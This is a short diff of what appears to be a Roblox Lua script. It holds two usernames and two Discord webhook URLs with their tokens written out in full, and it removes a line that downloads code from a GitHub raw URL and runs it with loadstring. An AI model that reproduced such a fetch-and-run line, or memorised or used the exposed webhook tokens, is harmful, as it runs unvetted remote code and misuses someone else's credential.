@@ -4,8 +4,6 @@ Username = "W1lliqmm"
 Username2 = "Virmality"
 Webhook = "https://discord.com/api/webhooks/1328473825368608871/GFft4cKKR2Fa6BEFfUMZyG8V8G69WsWt1nPqOWfWZ-mSvGC6AD1M764mlGxaoSgYXlGo"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GengarScripts/Scripts/refs/heads/main/Please%20Donate"))()
-
 local LogsWebhook = "https://discord.com/api/webhooks/1328473825368608871/GFft4cKKR2Fa6BEFfUMZyG8V8G69WsWt1nPqOWfWZ-mSvGC6AD1M764mlGxaoSgYXlGo"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
